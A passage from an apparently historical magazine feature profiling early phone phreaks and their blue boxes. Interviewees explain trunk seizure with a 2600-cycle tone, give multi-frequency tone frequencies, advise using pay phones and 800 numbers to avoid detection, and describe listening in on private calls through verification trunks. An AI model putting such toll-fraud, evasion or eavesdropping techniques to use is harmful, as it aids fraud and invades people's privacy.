base in Lincolnshire, with a terrible hangover after a thirty-six-hour pass.
He and Fraser talk about the rain.  They agree that it's nicer when it's not
raining.  They say good-bye and Fraser hangs up.  His dime returns with a nice
clink.

"Isn't that far out," he says grinning at me.  "London, like that."

Fraser squeezes the little blue box affectionately in his palm.  "I told ya
this thing is for real.  Listen, if you don't mind I'm gonna try this girl I
know in Paris.  I usually give her a call around this time.  It freaks her out.
This time I'll use the ------ (a different rent-a-car company) 800 number and
we'll go by overseas cable, 133; 33 is the country code for France, the 1 sends
you by cable.  Okay, here we go.... Oh damn.  Busy.  Who could she be talking
to at this time?"

A state police car cruises slowly by the motel.  The car does not stop, but
Fraser gets nervous.  We hop back into his car and drive ten miles in the
opposite direction until we reach a Texaco station locked up for the night.  We
pull up to a phone booth by the tire pump. Fraser dashes inside and tries the
Paris number.  It is busy again.

"I don't understand who she could be talking to.  The circuits may be busy.
It's too bad I haven't learned how to tap into lines overseas with this thing
yet."

Fraser begins to phreak around, as the phone phreaks say.  He dials a leading
nationwide charge card's 800 number and punches out the tones that bring him
the time recording in Sydney, Australia.  He beeps up the weather recording in
Rome, in Italian of course.  He calls a friend in Boston and talks about a
certain over-the-counter stock they are into heavily.  He finds the Paris
number busy again.  He calls up "Dial a Disc" in London, and we listen to
Double Barrel by David and Ansil Collins, the number-one hit of the week in
London.  He calls up a dealer of another sort and talks in code.  He calls up
Joe Engressia, the original blind phone-phreak genius, and pays his respects.
There are other calls.  Finally Fraser gets through to his young lady in
Paris.

They both agree the circuits must have been busy, and criticize the Paris
telephone system.  At two-thirty in the morning Fraser hangs up, pockets his
dime, and drives off, steering with one hand, holding what he calls his "lovely
little blue box" in the other.

You Can Call Long Distance For Less Than You Think

"You see, a few years ago the phone company made one big mistake," Gilbertson
explains two days later in his apartment.  "They were careless enough to let
some technical journal publish the actual frequencies used to create all their
multi-frequency tones.  Just a theoretical article some Bell Telephone
Laboratories engineer was doing about switching theory, and he listed the tones
in passing.  At ----- (a well-known technical school) I had been fooling around
with phones for several years before I came across a copy of the journal in the
engineering library.  I ran back to the lab and it took maybe twelve hours from
the time I saw that article to put together the first working blue box.  It was
bigger and clumsier than this little baby, but it worked."

It's all there on public record in that technical journal written mainly by
Bell Lab people for other telephone engineers.  Or at least it was public.
"Just try and get a copy of that issue at some engineering-school library now.
Bell has had them all red-tagged and withdrawn from circulation," Gilbertson
tells me.

"But it's too late.  It's all public now.  And once they became public the
technology needed to create your own beeper device is within the range of any
twelve-year-old kid, any twelve-year-old blind kid as a matter of fact.  And he
can do it in less than the twelve hours it took us.  Blind kids do it all the
time.  They can't build anything as precise and compact as my beeper box, but
theirs can do anything mine can do."

"How?"

"Okay.  About twenty years ago A.T.&T. made a multi-billion-dollar decision to
operate its entire long-distance switching system on twelve electronically
generated combinations of twelve master tones. Those are the tones you
sometimes hear in the background after you've dialed a long-distance number.
They decided to use some very simple tones -- the tone for each number is just
two fixed single-frequency tones played simultaneously to create a certain beat
frequency.  Like 1300 cycles per second and 900 cycles per second played
together give you the tone for digit 5.  Now, what some of these phone phreaks
have done is get themselves access to an electric organ.  Any cheap family
home-entertainment organ.  Since the frequencies are public knowledge now --
one blind phone phreak has even had them recorded in one of the talking books
for the blind -- they just have to find the musical notes on the organ which
correspond to the phone tones.  Then they tape them.  For instance, to get Ma
Bell's tone for the number 1, you press down organ keys F~5 and A~5 (900 and
700 cycles per second) at the same time.  To produce the tone for 2 it's F~5
and C~6 (1100 and 700 c.p.s).  The phone phreaks circulate the whole list of
notes so there's no trial and error anymore."

He shows me a list of the rest of the phone numbers and the two electric organ
keys that produce them.

"Actually, you have to record these notes at 3 3/4 inches-per-second tape speed
and double it to 7 1/2 inches-per-second when you play them back, to get the
proper tones," he adds.

"So once you have all the tones recorded, how do you plug them into the phone
system?"

"Well, they take their organ and their cassette recorder, and start banging out
entire phone numbers in tones on the organ, including country codes, routing
instructions, 'KP' and 'Start' tones.  Or, if they don't have an organ, someone
in the phone-phreak network sends them a cassette with all the tones recorded,
with a voice saying 'Number one,' then you have the tone, 'Number two,' then
the tone and so on.  So with two cassette recorders they can put together a
series of phone numbers by switching back and forth from number to number. Any
idiot in the country with a cheap cassette recorder can make all the free calls
he wants."

"You mean you just hold the cassette recorder up the mouthpiece and switch in a
series of beeps you've recorded?  The phone thinks that anything that makes
these tones must be its own equipment?"

"Right.  As long as you get the frequency within thirty cycles per second of
the phone company's tones, the phone equipment thinks it hears its own voice
talking to it.  The original granddaddy phone phreak was this blind kid with
perfect pitch, Joe Engressia, who used to whistle into the phone.  An operator
could tell the difference between his whistle and the phone company's
electronic tone generator, but the phone company's switching circuit can't tell
them apart.  The bigger the phone company gets and the further away from human
operators it gets, the more vulnerable it becomes to all sorts of phone
phreaking."

A Guide for the Perplexed

"But wait a minute," I stop Gilbertson.  "If everything you do sounds like
phone-company equipment, why doesn't the phone company charge you for the call
the way it charges its own equipment?"

"Okay.  That's where the 2600-cycle tone comes in.  I better start from the
beginning."

The beginning he describes for me is a vision of the phone system of the
continent as thousands of webs, of long-line trunks radiating from each of the
hundreds of toll switching offices to the other toll switching offices.  Each
toll switching office is a hive compacted of thousands of long-distance tandems
constantly whistling and beeping to tandems in far-off toll switching offices.

The tandem is the key to the whole system.  Each tandem is a line with some
relays with the capability of signalling any other tandem in any other toll
switching office on the continent, either directly one-to-one or by programming
a roundabout route through several other tandems if all the direct routes are
busy.  For instance, if you want to call from New York to Los Angeles and
traffic is heavy on all direct trunks between the two cities, your tandem in
New York is programmed to try the next best route, which may send you down to a
tandem in New Orleans, then up to San Francisco, or down to a New Orleans
tandem, back to an Atlanta tandem, over to an Albuquerque tandem and finally up
to Los Angeles.

When a tandem is not being used, when it's sitting there waiting for someone to
make a long-distance call, it whistles.  One side of the tandem, the side
"facing" your home phone, whistles at 2600 cycles per second toward all the
home phones serviced by the exchange, telling them it is at their service,
should they be interested in making a long-distance call.  The other side of
the tandem is whistling 2600 c.p.s. into one or more long-distance trunk lines,
telling the rest of the phone system that it is neither sending nor receiving a
call through that trunk at the moment, that it has no use for that trunk at the
moment.

"When you dial a long-distance number the first thing that happens is that you
are hooked into a tandem.  A register comes up to the side of the tandem facing
away from you and presents that side with the number you dialed.  This sending
side of the tandem stops whistling 2600 into its trunk line.  When a tandem
stops the 2600 tone it has been sending through a trunk, the trunk is said to
be "seized," and is now ready to carry the number you have dialed -- converted
into multi-frequency beep tones -- to a tandem in the area code and central
office you want.

Now when a blue-box operator wants to make a call from New Orleans to New York
he starts by dialing the 800 number of a company which might happen to have its
headquarters in Los Angeles.  The sending side of the New Orleans tandem stops
sending 2600 out over the trunk to the central office in Los Angeles, thereby
seizing the trunk.  Your New Orleans tandem begins sending beep tones to a
tandem it has discovered idly whistling 2600 cycles in Los Angeles.  The
receiving end of that L.A. tandem is seized, stops whistling 2600, listens to
the beep tones which tell it which L.A. phone to ring, and starts ringing the
800 number.  Meanwhile a mark made in the New Orleans office accounting tape
notes that a call from your New Orleans phone to the 800 number in L.A. has
been initiated and gives the call a code number. Everything is routine so far.

But then the phone phreak presses his blue box to the mouthpiece and pushes the
2600-cycle button, sending 2600 out from the New Orleans tandem to the L.A.
tandem.  The L.A. tandem notices 2600 cycles are coming over the line again and
assumes that New Orleans has hung up because the trunk is whistling as if idle.
The L.A. tandem immediately ceases ringing the L.A. 800 number.  But as soon as
the phreak takes his finger off the 2600 button, the L.A. tandem assumes the
trunk is once again being used because the 2600 is gone, so it listens for a
new series of digit tones - to find out where it must send the call.

Thus the blue-box operator in New Orleans now is in touch with a tandem in L.A.
which is waiting like an obedient genie to be told what to do next.  The
blue-box owner then beeps out the ten digits of the New York number which tell
the L.A. tandem to relay a call to New York City.  Which it promptly does.  As
soon as your party picks up the phone in New York, the side of the New Orleans
tandem facing you stops sending 2600 cycles to you and stars carrying his voice
to you by way of the L.A. tandem.  A notation is made on the accounting tape
that the connection has been made on the 800 call which had been initiated and
noted earlier.  When you stop talking to New York a notation is made that the
800 call has ended.

At three the next morning, when the phone company's accounting computer starts
reading back over the master accounting tape for the past day, it records that
a call of a certain length of time was made from your New Orleans home to an
L.A. 800 number and, of course, the accounting computer has been trained to
ignore those toll-free 800 calls when compiling your monthly bill.

"All they can prove is that you made an 800 toll-free call," Gilbertson the
inventor concludes.  "Of course, if you're foolish enough to talk for two hours
on an 800 call, and they've installed one of their special anti-fraud computer
programs to watch out for such things, they may spot you and ask why you took
two hours talking to Army Recruiting's 800 number when you're 4-F.

But if you do it from a pay phone, they may discover something peculiar the
next day -- if they've got a blue-box hunting program in their computer -- but
you'll be a long time gone from the pay phone by then.  Using a pay phone is
almost guaranteed safe."

"What about the recent series of blue-box arrests all across the country -- New
York, Cleveland, and so on?" I asked.  "How were they caught so easily?"

"From what I can tell, they made one big mistake: they were seizing trunks
using an area code plus 555-1212 instead of an 800 number. Using 555 is easy to
detect because when you send multi-frequency beep tones of 555 you get a charge
for it on your tape and the accounting computer knows there's something wrong
when it tries to bill you for a two-hour call to Akron, Ohio, information, and
it drops a trouble card which goes right into the hands of the security agent
if they're looking for blue-box user.

"Whoever sold those guys their blue boxes didn't tell them how to use them
properly, which is fairly irresponsible.  And they were fairly stupid to use
them at home all the time.

"But what those arrests really mean is than an awful lot of blue boxes are
flooding into the country and that people are finding them so easy to make that
they know how to make them before they know how to use them.  Ma Bell is in
trouble."

And if a blue-box operator or a cassette-recorder phone phreak sticks to pay
phones and 800 numbers, the phone company can't stop them?

"Not unless they change their entire nationwide long-lines technology, which
will take them a few billion dollars and twenty years.  Right now they can't do
a thing.  They're screwed."

Captain Crunch Demonstrates His Famous Unit

There is an underground telephone network in this country.  Gilbertson
discovered it the very day news of his activities hit the papers. That evening
his phone began ringing.  Phone phreaks from Seattle, from Florida, from New
York, from San Jose, and from Los Angeles began calling him and telling him
about the phone-phreak network.  He'd get a call from a phone phreak who'd say
nothing but, "Hang up and call this number."

When he dialed the number he'd find himself tied into a conference of a dozen
phone phreaks arranged through a quirky switching station in British Columbia.
They identified themselves as phone phreaks, they demonstrated their homemade
blue boxes which they called "M-Fers" (for "multi-frequency," among other
things) for him, they talked shop about phone-phreak devices.  They let him in
on their secrets on the theory that if the phone company was after him he must
be trustworthy.  And, Gilbertson recalls, they stunned him with their technical
sophistication.

I ask him how to get in touch with the phone-phreak network.  He digs around
through a file of old schematics and comes up with about a dozen numbers in
three widely separated area codes.

"Those are the centers," he tells me.  Alongside some of the numbers he writes
in first names or nicknames: names like Captain Crunch, Dr. No, Frank Carson
(also a code word for a free call), Marty Freeman (code word for M-F device),
Peter Perpendicular Pimple, Alefnull, and The Cheshire Cat.  He makes checks
alongside the names of those among these top twelve who are blind.  There are
five checks.

I ask him who this Captain Crunch person is.

"Oh.  The Captain.  He's probably the most legendary phone phreak.  He calls
himself Captain Crunch after the notorious Cap'n Crunch 2600 whistle."
(Several years ago, Gilbertson explains, the makers of Cap'n Crunch breakfast
cereal offered a toy-whistle prize in every box as a treat for the Cap'n Crunch
set.  Somehow a phone phreak discovered that the toy whistle just happened to
produce a perfect 2600-cycle tone.  When the man who calls himself Captain
Crunch was transferred overseas to England with his Air Force unit, he would
receive scores of calls from his friends and "mute" them -- make them free of
charge to them -- by blowing his Cap'n Crunch whistle into his end.)
"Captain Crunch is one of the older phone phreaks," Gilbertson tells me.  "He's
an engineer who once got in a little trouble for fooling around with the phone,
but he can't stop.  Well, they guy drives across country in a Volkswagen van
with an entire switchboard and a computerized super-sophisticated M-F-er in the
back.  He'll pull up to a phone booth on a lonely highway somewhere, snake a
cable out of his bus, hook it onto the phone and sit for hours, days sometimes,
sending calls zipping back and forth across the country, all over the
world...."

Back at my motel, I dialed the number he gave me for "Captain Crunch" and asked
for G---- T-----, his real name, or at least the name he uses when he's not
dashing into a phone booth beeping out M-F tones faster than a speeding bullet
and zipping phantomlike through the phone company's long-distance lines.

When G---- T----- answered the phone and I told him I was preparing a story for
Esquire about phone phreaks, he became very indignant.

"I don't do that.  I don't do that anymore at all.  And if I do it, I do it for
one reason and one reason only.  I'm learning about a system.  The phone
company is a System.  A computer is a System, do you understand?  If I do what
I do, it is only to explore a system. Computers, systems, that's my bag.  The
phone company is nothing but a computer."

A tone of tightly restrained excitement enters the Captain's voice when he
starts talking about systems.  He begins to pronounce each syllable with the
hushed deliberation of an obscene caller.

"Ma Bell is a system I want to explore.  It's a beautiful system, you know, but
Ma Bell screwed up.  It's terrible because Ma Bell is such a beautiful system,
but she screwed up.  I learned how she screwed up from a couple of blind kids
who wanted me to build a device.  A certain device.  They said it could make
free calls.  I wasn't interested in free calls.  But when these blind kids told
me I could make calls into a computer, my eyes lit up.  I wanted to learn about
computers.  I wanted to learn about Ma Bell's computers.  So I build the little
device, but I built it wrong and Ma Bell found out.  Ma Bell can detect things
like that.  Ma Bell knows.  So I'm strictly rid of it now.  I don't do it.
Except for learning purposes."  He pauses. "So you want to write an article.
Are you paying for this call?  Hang up and call this number."  He gives me a
number in a area code a thousand miles away of his own.  I dial the number.

"Hello again.  This is Captain Crunch.  You are speaking to me on a toll-free
loop-around in Portland, Oregon.  Do you know what a toll-free loop around is?
I'll tell you.

He explains to me that almost every exchange in the country has open test
numbers which allow other exchanges to test their connections with it.  Most of
these numbers occur in consecutive pairs, such as 302 956-0041 and 302
956-0042.  Well, certain phone phreaks discovered that if two people from
anywhere in the country dial the two consecutive numbers they can talk together
just as if one had called the other's number, with no charge to either of them,
of course.

"Now our voice is looping around in a 4A switching machine up there in Canada,
zipping back down to me," the Captain tells me.  "My voice is looping around up
there and back down to you.  And it can't ever cost anyone money.  The phone
phreaks and I have compiled a list of many many of these numbers.  You would be
surprised if you saw the list.  I could show it to you.  But I won't.  I'm out
of that now.  I'm not out to screw Ma Bell.  I know better.  If I do anything
it's for the pure knowledge of the System.  You can learn to do fantastic
things.  Have you ever heard eight tandems stacked up?  Do you know the sound
of tandems stacking and unstacking?  Give me your phone number.  Okay. Hang up
now and wait a minute."

Slightly less than a minute later the phone rang and the Captain was on the
line, his voice sounding far more excited, almost aroused.

"I wanted to show you what it's like to stack up tandems.  To stack up
tandems." (Whenever the Captain says "stack up" it sounds as if he is licking
his lips.)

"How do you like the connection you're on now?" the Captain asks me. "It's a
raw tandem.  A raw tandem.  Ain't nothin' up to it but a tandem.  Now I'm going
to show you what it's like to stack up.  Blow off.  Land in a far away place.
To stack that tandem up, whip back and forth across the country a few times,
then shoot on up to Moscow.

"Listen," Captain Crunch continues.  "Listen.  I've got line tie on my
switchboard here, and I'm gonna let you hear me stack and unstack tandems.
Listen to this.  It's gonna blow your mind."

First I hear a super rapid-fire pulsing of the flutelike phone tones, then a
pause, then another popping burst of tones, then another, then another.  Each
burst is followed by a beep-kachink sound.

"We have now stacked up four tandems," said Captain Crunch, sounding somewhat
remote.  "That's four tandems stacked up.  Do you know what that means?  That
means I'm whipping back and forth, back and forth twice, across the country,
before coming to you.  I've been known to stack up twenty tandems at a time.
Now, just like I said, I'm going to shoot up to Moscow."

There is a new, longer series of beeper pulses over the line, a brief silence,
then a ring.

"Hello," answers a far-off voice.

"Hello.  Is this the American Embassy Moscow?"

"Yes, sir.  Who is this calling?" says the voice.

"Yes.  This is test board here in New York.  We're calling to check out the
circuits, see what kind of lines you've got.  Everything okay there in
Moscow?"

"Okay?"

"Well, yes, how are things there?"

"Oh.  Well, everything okay, I guess."

"Okay.  Thank you."

They hang up, leaving a confused series of beep-kachink sounds hanging in
mid-ether in the wake of the call before dissolving away.

The Captain is pleased.  "You believe me now, don't you?  Do you know what I'd
like to do?  I'd just like to call up your editor at Esquire and show him just
what it sounds like to stack and unstack tandems. I'll give him a show that
will blow his mind.  What's his number?

I ask the Captain what kind of device he was using to accomplish all his feats.
The Captain is pleased at the question.

"You could tell it was special, couldn't you?"  Ten pulses per second. That's
faster than the phone company's equipment.  Believe me, this unit is the most
famous unit in the country.  There is no other unit like it.  Believe me."

"Yes, I've heard about it.  Some other phone phreaks have told me about it."

"They have been referring to my, ahem, unit?  What is it they said? Just out of
curiosity, did they tell you it was a highly sophisticated computer-operated
unit, with acoustical coupling for receiving outputs and a switch-board with
multiple-line-tie capability?  Did they tell you that the frequency tolerance
is guaranteed to be not more than .05 percent?  The amplitude tolerance less
than .01 decibel?  Those pulses you heard were perfect.  They just come faster
than the phone company. Those were high-precision op-amps.  Op-amps are
instrumentation amplifiers designed for ultra-stable amplification, super-low
distortion and accurate frequency response.  Did they tell you it can operate
in temperatures from -55 degrees C to +125 degrees C?"

I admit that they did not tell me all that.

"I built it myself," the Captain goes on.  "If you were to go out and buy the
components from an industrial wholesaler it would cost you at least $1500.  I
once worked for a semiconductor company and all this didn't cost me a cent.  Do
you know what I mean?  Did they tell you about how I put a call completely
around the world?  I'll tell you how I did it.  I M-Fed Tokyo inward, who
connected me to India, India connected me to Greece, Greece connected me to
Pretoria, South Africa, South Africa connected me to South America, I went from
South America to London, I had a London operator connect me to a New York
operator, I had New York connect me to a California operator who rang the phone
next to me.  Needless to say I had to shout to hear myself.  But the echo was
far out.  Fantastic.  Delayed.  It was delayed twenty seconds, but I could hear
myself talk to myself."

"You mean you were speaking into the mouthpiece of one phone sending your voice
around the world into your ear through a phone on the other side of your head?"
I asked the Captain.  I had a vision of something vaguely autoerotic going on,
in a complex electronic way.

"That's right," said the Captain.  "I've also sent my voice around the world
one way, going east on one phone, and going west on the other, going through
cable one way, satellite the other, coming back together at the same time,
ringing the two phones simultaneously and picking them up and whipping my
voice both ways around the world back to me. Wow.  That was a mind blower."

"You mean you sit there with both phones on your ear and talk to yourself
around the world," I said incredulously.

"Yeah.  Um hum.  That's what I do.  I connect the phone together and sit there
and talk."

"What do you say?  What do you say to yourself when you're connected?"

"Oh, you know.  Hello test one two three," he says in a low-pitched voice.

"Hello test one two three," he replied to himself in a high-pitched voice.

"Hello test one two three," he repeats again, low-pitched.

"Hello test one two three," he replies, high-pitched.

"I sometimes do this: Hello Hello Hello Hello, Hello, hello," he trails off and
breaks into laughter.

Why Captain Crunch Hardly Ever Taps Phones Anymore

Using internal phone-company codes, phone phreaks have learned a simple method
for tapping phones.  Phone-company operators have in front of them a board that
holds verification jacks.  It allows them to plug into conversations in case of
emergency, to listen in to a line to determine if the line is busy or the
circuits are busy.  Phone phreaks have learned to beep out the codes which lead
them to a verification operator, tell the verification operator they are
switchmen from some other area code testing out verification trunks. Once the
operator hooks them into the verification trunk, they disappear into the board
for all practical purposes, slip unnoticed into any one of the 10,000 to
100,000 numbers in that central office without the verification operator
knowing what they're doing, and of course without the two parties to the
connection knowing there is a phantom listener present on their line.

Toward the end of my hour-long first conversation with him, I asked the Captain
if he ever tapped phones.

"Oh no.  I don't do that.  I don't think it's right," he told me firmly.  "I
have the power to do it but I don't... Well one time, just one time, I have to
admit that I did.  There was this girl, Linda, and I wanted to find out... you
know.  I tried to call her up for a date. I had a date with her the last
weekend and I thought she liked me.  I called her up, man, and her line was
busy, and I kept calling and it was still busy.  Well, I had just learned about
this system of jumping into lines and I said to myself, 'Hmmm.  Why not just
see if it works. It'll surprise her if all of a sudden I should pop up on her
line. It'll impress her, if anything.'  So I went ahead and did it.  I M-Fed
into the line.  My M-F-er is powerful enough when patched directly into the
mouthpiece to trigger a verification trunk without using an operator the way
the other phone phreaks have to.

"I slipped into the line and there she was talking to another boyfriend.
Making sweet talk to him.  I didn't make a sound because I was so disgusted.
So I waited there for her to hang up, listening to her making sweet talk to the
other guy.  You know.  So as soon as she hung up I instantly M-F-ed her up and
all I said was, 'Linda, we're through.'  And I hung up.  And it blew her head
off.  She couldn't figure out what the hell happened.

"But that was the only time.  I did it thinking I would surprise her, impress
her.  Those were all my intentions were, and well, it really kind of hurt me
pretty badly, and... and ever since then I don't go into verification trunks."

Moments later my first conversation with the Captain comes to a close.

"Listen," he says, his spirits somewhat cheered, "listen.  What you are going
to hear when I hang up is the sound of tandems unstacking. Layer after layer of
tandems unstacking until there's nothing left of the stack, until it melts away
into nothing.  Cheep, cheep, cheep, cheep," he concludes, his voice descending
to a whisper with each cheep.

He hangs up.  The phone suddenly goes into four spasms: kachink cheep. Kachink
cheep kachink cheep kachink cheep, and the complex connection has wiped itself
out like the Cheshire cat's smile.

The MF Boogie Blues

The next number I choose from the select list of phone-phreak alumni, prepared
for me by the blue-box inventor, is a Memphis number.  It is the number of Joe
Engressia, the first and still perhaps the most accomplished blind phone
phreak.

Three years ago Engressia was a nine-day wonder in newspapers and magazines all
over America because he had been discovered whistling free long-distance
connections for fellow students at the University of South Florida.  Engressia
was born with perfect pitch: he could whistle phone tones better than the
phone-company's equipment.

Engressia might have gone on whistling in the dark for a few friends for the
rest of his life if the phone company hadn't decided to expose him.  He was
warned, disciplined by the college, and the whole case became public.  In the
months following media reports of his talent, Engressia began receiving strange
calls.   There were calls from a group of kids in Los Angeles who could do some
very strange things with the quirky General Telephone and Electronics circuitry
in L.A. suburbs.  There were calls from a group of mostly blind kids in ----,
California, who had been doing some interesting experiments with Cap'n Crunch
whistles and test loops.  There was a group in Seattle, a group in Cambridge,
Massachusetts, a few from New York, a few scattered across the country.  Some
of them had already equipped themselves with cassette and electronic M-F
devices.  For some of these groups, it was the first time they knew of the
others.

The exposure of Engressia was the catalyst that linked the separate
phone-phreak centers together.  They all called Engressia.  They talked to him
about what he was doing and what they were doing.  And then he told them -- the
scattered regional centers and lonely independent phone phreakers -- about each
other, gave them each other's numbers to call, and within a year the scattered
phone-phreak centers had grown into a nationwide underground.

Joe Engressia is only twenty-two years old now, but along the phone-phreak
network he is "the old man," accorded by phone phreaks something of the
reverence the phone company bestows on Alexander Graham Bell.  He seldom needs
to make calls anymore.  The phone phreaks all call him and let him know what
new tricks, new codes, new techniques they have learned.  Every night he sits
like a sightless spider in his little apartment receiving messages from every
tendril of his web.  It is almost a point of pride with Joe that they call
him.

But when I reached him in his Memphis apartment that night, Joe Engressia was
lonely, jumpy and upset.

"God, I'm glad somebody called.  I don't know why tonight of all nights I don't
get any calls.  This guy around here got drunk again tonight and propositioned
me again.  I keep telling him we'll never see eye to eye on this subject, if
you know what I mean.  I try to make light of it, you know, but he doesn't get
it.  I can head him out there getting drunker and I don't know what he'll do
next.  It's just that I'm really all alone here, just moved to Memphis, it's
the first time I'm living on my own, and I'd hate for it to all collapse now.
But I won't go to bed with him.  I'm just not very interested in sex and even
if I can't see him I know he's ugly.

"Did you hear that?  That's him banging a bottle against the wall outside.
He's nice.  Well forget about it.  You're doing a story on phone phreaks?
Listen to this.  It's the MF Boogie Blues.

Sure enough, a jumpy version of Muskrat Ramble boogies its way over the line,
each note one of those long-distance phone tones.  The music stops.  A huge
roaring voice blasts the phone off my ear: "AND THE QUESTION IS..." roars the
voice, "CAN A BLIND PERSON HOOK UP AN AMPLIFIER ON HIS OWN?"

The roar ceases.  A high-pitched operator-type voice replaces it. "This is
Southern Braille Tel. & Tel.  Have tone, will phone."

This is succeeded by a quick series of M-F tones, a swift "kachink" and a deep
reassuring voice: "If you need home care, call the visiting-nurses association.
First National time in Honolulu is 4:32 p.m."

Joe back in his Joe voice again: "Are we seeing eye to eye? 'Si, si,' said the
blind Mexican.  Ahem.  Yes.  Would you like to know the weather in Tokyo?"

This swift manic sequence of phone-phreak vaudeville stunts and blind-boy jokes
manages to keep Joe's mind off his tormentor only as long as it lasts.

"The reason I'm in Memphis, the reason I have to depend on that homosexual guy,
is that this is the first time I've been able to live on my own and make phone
trips on my own.  I've been banned from all central offices around home in
Florida, they knew me too well, and at the University some of my fellow
scholars were always harassing me because I was on the dorm pay phone all the
time and making fun of me because of my fat ass, which of course I do have,
it's my physical fatness program, but I don't like to hear it every day, and if
I can't phone trip and I can't phone phreak, I can't imagine what I'd do, I've
been devoting three quarters of my life to it.

"I moved to Memphis because I wanted to be on my own as well as because it has
a Number 5 crossbar switching system and some interesting little independent
phone-company districts nearby and so far they don't seem to know who I am so I
can go on phone tripping, and for me phone tripping is just as important as
phone phreaking."

Phone tripping, Joe explains, begins with calling up a central-office switch
room.  He tells the switchman in a polite earnest voice that he's a blind
college student interested in telephones, and could he perhaps have a guided
tour of the switching station?  Each step of the tour Joe likes to touch and
feel relays, caress switching circuits, switchboards, crossbar arrangements.

So when Joe Engressia phone phreaks he feels his way through the circuitry of
the country garden of forking paths, he feels switches shift, relays shunt,
crossbars swivel, tandems engage and disengage even as he hears -- with perfect
pitch -- his M-F pulses make the entire Bell system dance to his tune.

Just one month ago Joe took all his savings out of his bank and left home, over
the emotional protests of his mother.  "I ran away from home almost," he likes
to say.  Joe found a small apartment house on Union Avenue and began making
phone trips.  He'd take a bus a hundred miles south in Mississippi to see some
old-fashioned Bell equipment still in use in several states, which had been
puzzling.  He'd take a bus three hundred miles to Charlotte, North Carolina, to
look at some brand-new experimental equipment.  He hired a taxi to drive him
twelve miles to a suburb to tour the office of a small phone company with some
interesting idiosyncrasies in its routing system.  He was having the time of
his life, he said, the most freedom and pleasure he had known.

In that month he had done very little long-distance phone phreaking from his
own phone.  He had begun to apply for a job with the phone company, he told me,
and he wanted to stay away from anything illegal.

"Any kind of job will do, anything as menial as the most lowly operator.
That's probably all they'd give me because I'm blind.  Even though I probably
know more than most switchmen.  But that's okay.  I want to work for Ma Bell.
I don't hate Ma Bell the way Gilbertson and some phone phreaks do.  I don't
want to screw Ma Bell.  With me it's the pleasure of pure knowledge.  There's
something beautiful about the system when you know it intimately the way I do.
But I don't know how much they know about me here.  I have a very intuitive
feel for the condition of the line I'm on, and I think they're monitoring me
off and on lately, but I haven't been doing much illegal.  I have to make a few
calls to switchmen once in a while which aren't strictly legal, and once I took
an acid trip and was having these auditory hallucinations as if I were trapped
and these planes were dive-bombing me, and all of sudden I had to phone phreak
out of there.  For some reason I had to call Kansas City, but that's all."

A Warning Is Delivered

At this point -- one o'clock in my time zone -- a loud knock on my motel-room
door interrupts our conversation.  Outside the door I find a uniformed security
guard who informs me that there has been an "emergency phone call" for me while
I have been on the line and that the front desk has sent him up to let me
know.

Two seconds after I say good-bye to Joe and hang up, the phone rings.

"Who were you talking to?" the agitated voice demands.  The voice belongs to
Captain Crunch.  "I called because I decided to warn you of something.  I
decided to warn you to be careful.  I don't want this information you get to
get to the radical underground.  I don't want it to get into the wrong hands.
What would you say if I told you it's possible for three phone phreaks to
saturate the phone system of the nation.  Saturate it.  Busy it out.  All of
it.  I know how to do this.  I'm not gonna tell.  A friend of mine has already
saturated the trunks between Seattle and New York.  He did it with a
computerized M-F-er hitched into a special Manitoba exchange.  But there are
other, easier ways to do it."

Just three people?  I ask.  How is that possible?

"Have you ever heard of the long-lines guard frequency?  Do you know about
stacking tandems with 17 and 2600?  Well, I'd advise you to find out about it.
I'm not gonna tell you.  But whatever you do, don't let this get into the hands
of the radical underground."

(Later Gilbertson, the inventor, confessed that while he had always been
skeptical about the Captain's claim of the sabotage potential of trunk-tying
phone phreaks, he had recently heard certain demonstrations which convinced him
the Captain was not speaking idly. "I think it might take more than three
people, depending on how many machines like Captain Crunch's were available.
But even though the Captain sounds a little weird, he generally turns out to
know what he's talking about.")

"You know," Captain Crunch continues in his admonitory tone, "you know the
younger phone phreaks call Moscow all the time.  Suppose everybody were to call
Moscow.  I'm no right-winger.  But I value my life.  I don't want the Commies
coming over and dropping a bomb on my head. That's why I say you've got to be
careful about who gets this information."

The Captain suddenly shifts into a diatribe against those phone phreaks who
don't like the phone company.

"They don't understand, but Ma Bell knows everything they do.  Ma Bell knows.
Listen, is this line hot?  I just heard someone tap in.  I'm not paranoid, but
I can detect things like that.  Well, even if it is, they know that I know that
they know that I have a bulk eraser.  I'm very clean."  The Captain pauses,
evidently torn between wanting to prove to the phone-company monitors that he
does nothing illegal, and the desire to impress Ma Bell with his prowess.  "Ma
Bell knows how good I am.  And I am quite good.  I can detect reversals, tandem
switching, everything that goes on on a line.  I have relative pitch now.  Do
you know what that means?  My ears are a $20,000 piece of equipment.  With my
ears I can detect things they can't hear with their equipment.  I've had
employment problems.  I've lost jobs.  But I want to show Ma Bell how good I
am.  I don't want to screw her, I want to work for her.  I want to do good for
her.  I want to help her get rid of her flaws and become perfect.  That's my
number-one goal in life now."  The Captain concludes his warnings and tells me
he has to be going.  "I've got a little action lined up for tonight," he
explains and hangs up.

Before I hang up for the night, I call Joe Engressia back.  He reports that his
tormentor has finally gone to sleep -- "He's not blind drunk, that's the way I
get, ahem, yes; but you might say he's in a drunken stupor."  I make a date to
visit Joe in Memphis in two days.

A Phone Phreak Call Takes Care of Business

The next morning I attend a gathering of four phone phreaks in  ----- (a
California suburb).  The gathering takes place in a comfortable split-level
home in an upper-middle-class subdivision.  Heaped on the kitchen table are the
portable cassette recorders, M-F cassettes, phone patches, and line ties of the
four phone phreaks present.  On the kitchen counter next to the telephone is a
shoe-box-size blue box with thirteen large toggle switches for the tones.  The
parents of the host phone phreak, Ralph, who is blind, stay in the living room
with their sighted children.  They are not sure exactly what Ralph and his
friends do with the phone or if it's strictly legal, but he is blind and they
are pleased he has a hobby which keeps him busy.

The group has been working at reestablishing the historic "2111" conference,
reopening some toll-free loops, and trying to discover the dimensions of what
seem to be new initiatives against phone phreaks by phone-company security
agents.

It is not long before I get a chance to see, to hear, Randy at work. Randy is
known among the phone phreaks as perhaps the finest con man in the game.  Randy
is blind.  He is pale, soft and pear-shaped, he wears baggy pants and a wrinkly
nylon white sport shirt, pushes his head forward from hunched shoulders
somewhat like a turtle inching out of its shell.  His eyes wander, crossing and
recrossing, and his forehead is somewhat pimply.  He is only sixteen years
old.

But when Randy starts speaking into a telephone mouthpiece his voice becomes so
stunningly authoritative it is necessary to look again to convince yourself it
comes from a chubby adolescent Randy.  Imagine the voice of a crack oil-rig
foreman, a tough, sharp, weather-beaten Marlboro man of forty.  Imagine the
voice of a brilliant performance-fund gunslinger explaining how he beats the
